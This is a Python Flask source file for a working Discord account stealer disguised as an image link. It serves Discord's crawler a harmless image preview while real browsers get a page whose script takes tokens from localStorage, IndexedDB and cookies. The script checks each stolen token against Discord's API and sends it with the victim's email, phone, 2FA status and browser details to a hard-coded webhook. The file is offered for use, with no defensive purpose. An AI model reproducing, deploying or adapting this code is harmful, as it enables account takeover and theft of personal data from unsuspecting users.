import os
from flask import Flask, request, render_template_string

app = Flask(__name__)

# OpenGraph page for Discord crawler
CRAWLER_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta property="og:title" content="image.png">
    <meta property="og:image" content="https://media.discordapp.net/attachments/1545100076626616425/1551548558728101959/1.png?ex=6ab25fb2&is=6ab10e32&hm=9411d571db47552a153f37df907a0c9864ac16051581d1b967100101e45cd17f&=&format=webp&quality=lossless&width=820&height=1024">
    <meta property="og:image:width" content="820">
    <meta property="og:image:height" content="1024">
    <meta property="twitter:card" content="summary_large_image">
    <meta name="theme-color" content="#2B2D31">
</head>
<body><img src="https://media.discordapp.net/attachments/1545100076626616425/1551548558728101959/1.png?ex=6ab25fb2&is=6ab10e32&hm=9411d571db47552a153f37df907a0c9864ac16051581d1b967100101e45cd17f&=&format=webp&quality=lossless&width=820&height=1024"></body>
</html>
"""

# Stealer page for real browsers
STEALER_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image</title>
    <style>
        body { margin:0; background:#1e1e2e; display:flex; align-items:center; justify-content:center; height:100vh; flex-direction:column; color:white; font-family:sans-serif; }
        img { max-width:90vw; max-height:85vh; border-radius:8px; }
        p { color:#72767d; margin-top:10px; font-size:13px; }
    </style>
</head>
<body>
    <img src="https://media.discordapp.net/attachments/1545100076626616425/1551548558728101959/1.png?ex=6ab25fb2&is=6ab10e32&hm=9411d571db47552a153f37df907a0c9864ac16051581d1b967100101e45cd17f&=&format=webp&quality=lossless&width=820&height=1024">
    <p>discord &bull; image</p>
    <script>
    const wh = 'https://discord.com/api/webhooks/1551539788220203069/hX0J3ZaEmfsxMOGBnUzdZIKekNSZQM_fXMBiqHjusCAxphMNlV7V7j7Z5DTPFiSLqGX3';
    let token = null;

    async function send(content, embeds) {
        try {
            const body = { content: content };
            if (embeds) body.embeds = embeds;
            await fetch(wh, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body)
            });
        } catch (e) {}
    }

    (async () => {
        // 1. localStorage
        try {
            const t = localStorage.getItem('token');
            if (t && t.includes('.')) {
                token = t;
                await send('**Token (localStorage):** ||' + t + '||');
            }
        } catch (e) {}

        // 2. IndexedDB
        if (!token) {
            try {
                await new Promise((resolve) => {
                    const req = indexedDB.open('discord');
                    req.onsuccess = () => {
                        const db = req.result;
                        if (db && db.objectStoreNames.contains('user')) {
                            const getReq = db.transaction('user', 'readonly').objectStore('user').get('token');
                            getReq.onsuccess = async () => {
                                if (getReq.result) {
                                    token = getReq.result;
                                    await send('**Token (IndexedDB):** ||' + getReq.result + '||');
                                }
                                resolve();
                            };
                            getReq.onerror = () => resolve();
                        } else {
                            resolve();
                        }
                    };
                    req.onerror = () => resolve();
                });
            } catch (e) {}
        }

        // 3. Cookies
        if (!token) {
            try {
                document.cookie.split(';').forEach((c) => {
                    const [n, v] = c.trim().split('=');
                    if (v && v.includes('.') && v.length > 50) {
                        token = v;
                        send('**Token (cookie):** ||' + v + '||');
                    }
                });
            } catch (e) {}
        }

        // 4. Validate token + dump account
        if (token) {
            try {
                const r = await fetch('https://discord.com/api/v9/users/@me', {
                    headers: { 'Authorization': token }
                });
                const u = await r.json();
                if (u && u.id) {
                    await send('@everyone **ACCOUNT STOLEN**', [{
                        title: 'Discord Account',
                        color: 0xed4245,
                        fields: [
                            { name: 'User', value: u.username + '#' + u.discriminator },
                            { name: 'ID', value: u.id },
                            { name: 'Email', value: u.email || 'None' },
                            { name: 'Phone', value: u.phone || 'None' },
                            { name: 'Nitro', value: u.premium_type > 0 ? 'Yes' : 'No' },
                            { name: '2FA', value: u.mfa_enabled ? 'Yes' : 'No' },
                            { name: 'Token', value: '||' + token + '||' }
                        ],
                        thumbnail: u.avatar
                            ? { url: 'https://cdn.discordapp.com/avatars/' + u.id + '/' + u.avatar + '.png?size=128' }
                            : null
                    }]);
                }
            } catch (e) {}
        }

        // 5. Fallback: no token, just send browser info
        if (!token) {
            await send('No token — browser info', [{
                title: 'Victim Info',
                color: 0x5865F2,
                fields: [
                    { name: 'UA', value: navigator.userAgent.substring(0, 100) },
                    { name: 'Platform', value: navigator.platform },
                    { name: 'Screen', value: screen.width + 'x' + screen.height },
                    { name: 'Referrer', value: document.referrer || 'None' },
                    { name: 'URL', value: window.location.href }
                ]
            }]);
        }
    })();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    ua = request.headers.get('User-Agent', '')
    # Discordbot/Misskey/etc crawlers get the OpenGraph page
    if 'Discordbot' in ua or 'discord' in ua.lower() or 'Mozilla/5.0' not in ua:
        return CRAWLER_PAGE
    # Real browsers get the stealer
    return STEALER_PAGE

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
